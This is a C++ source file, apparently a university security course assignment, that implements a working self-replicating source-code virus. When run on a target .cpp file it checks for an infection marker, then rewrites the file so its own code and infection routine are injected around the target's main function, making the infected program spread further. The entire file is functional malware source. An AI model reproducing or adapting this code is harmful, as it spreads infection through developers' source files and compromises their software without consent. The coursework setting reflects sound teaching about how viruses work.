// COMP3632 Assignment 1 virus3.cpp
// Dhesant Nakka | 20146587

#include <iostream>
#include <fstream>
#include <sstream>
#include <cstring>

std::string init = "// COMP3632 Assignment 1 virus3.cpp\n\
// Dhesant Nakka | 20146587\n\
\n\
#include <iostream>\n\
#include <fstream>\n\
#include <sstream>\n\
#include <cstring>\n\
\n\
std::string init = \"\\\n@init\";\n\
std::string exec = \"\\\n@exec\";\n\
\n\
std::string escape_string(std::string in) {\n\
    std::string out;\n\
    \n\
    for (std::size_t i = 0; i < in.size(); ++i) {\n\
        if (in[i] == '\\\\')\n\
            out += \"\\\\\\\\\";\n\
        else if (in[i] == '\\n')\n\
            out += \"\\\\n\\\\\\n\";\n\
        else if (in[i] == '\\\"')\n\
            out += \"\\\\\\\"\";\n\
        else\n\
            out += in[i];\n\
    }\n\
    \n\
    return out;\n\
}";
        
std::string exec = "    if (argc < 1) {\n\
        std::cout << \"No target specified\" << std::endl;\n\
        return 1;\n\
    }\n\
    \n\
    std::cout << \"Opening: \" << argv[1] << std::endl;\n\
    \n\
    std::fstream fs;\n\
    fs.open(argv[1], std::fstream::in);\n\
    \n\
    if (!fs.is_open()) {\n\
        std::cout << \"File opening failed\" << std::endl;\n\
        return 1;\n\
    }\n\
    \n\
    std::stringstream ss;\n\
    ss << fs.rdbuf();\n\
    \n\
    fs.close();\n\
    \n\
    std::string s = ss.str();\n\
    if (s.find(\"COMP3632 Assignment 1 virus3.cpp\") != std::string::npos) {\n\
	std::cout << \"Target already infected, boo :(\" << std::endl;\n\
	return 1;\n\
    }\n\
    \n\
    fs.open(argv[1], std::fstream::out | std::fstream::trunc);\n\
    \n\
    if (!fs.is_open()) {\n\
        std::cout << \"File opening failed\" << std::endl;\n\
        return 1;\n\
    }\n\
    \n\
    std::string merged(init);\n\
    std::size_t pos;\n\
    pos = merged.find(\"@exec\");\n\
    merged.replace(pos, 5, escape_string(exec));\n\
    pos = merged.find(\"@init\");\n\
    merged.replace(pos, 5, escape_string(init));\n\
    \n\
    std::string readline;\n\
    while(getline(ss,readline)) {\n\
        if (readline.find(\"int main(int argc, char** argv) {\") != std::string::npos) {\n\
            fs << merged << std::endl;\n\
            fs << readline << std::endl;\n\
        }\n\
       else if (readline.find(\"return 0;\") != std::string::npos) {\n\
           fs << std::endl << exec << std::endl;\n\
           fs << readline << std::endl;\n\
       }\n\
       else\n\
           fs << readline << std::endl;\n\
    }\n\
    \n\
    fs.close();\n\
    std::cout << \"Attack Successful. Have a nice day!\" << std::endl;";

std::string escape_string(std::string in) {
    std::string out;
    
    for (std::size_t i = 0; i < in.size(); ++i) {
	if (in[i] == '\\')
	    out += "\\\\";
	else if (in[i] == '\n')
	    out += "\\n\\\n";
	else if (in[i] == '\"')
	    out += "\\\"";
	else
	    out += in[i];
    }
    
    return out;
}

int main (int argc, char** argv) {
    if (argc < 1) {
	std::cout << "No target specified" << std::endl;
	return 1;
    }
    
    std::cout << "Opening: " << argv[1] << std::endl;
    
    std::fstream fs;
    fs.open(argv[1], std::fstream::in);
    
    if (!fs.is_open()) {
	std::cout << "File opening failed" << std::endl;
	return 1;
    }

    std::stringstream ss;
    ss << fs.rdbuf();

    fs.close();

    std::string s = ss.str();
    if (s.find("COMP3632 Assignment 1 virus3.cpp") != std::string::npos) {
	std::cout << "Target already infected, boo :(" << std::endl;
	return 1;
    }
    
    fs.open(argv[1], std::fstream::out | std::fstream::trunc);
    
    if (!fs.is_open()) {
	std::cout << "File opening failed" << std::endl;
	return 1;
    }

    std::string merged(init);
    std::size_t pos;
    pos = merged.find("@exec");
    merged.replace(pos, 5, escape_string(exec));
    pos = merged.find("@init");
    merged.replace(pos, 5, escape_string(init));
    
    std::string readline;
    while(getline(ss,readline)) {
	if (readline.find("int main(int argc, char** argv) {") != std::string::npos) {
	    fs << merged << std::endl;
	    fs << readline << std::endl;
	}
	else if (readline.find("return 0;") != std::string::npos) {
	    fs << std::endl << exec << std::endl;
	    fs << readline << std::endl;
	}
	else
	    fs << readline << std::endl;
    }
    
    fs.close();
    std::cout << "Attack Successful. Have a nice day!" << std::endl;
    
    return 0;
}
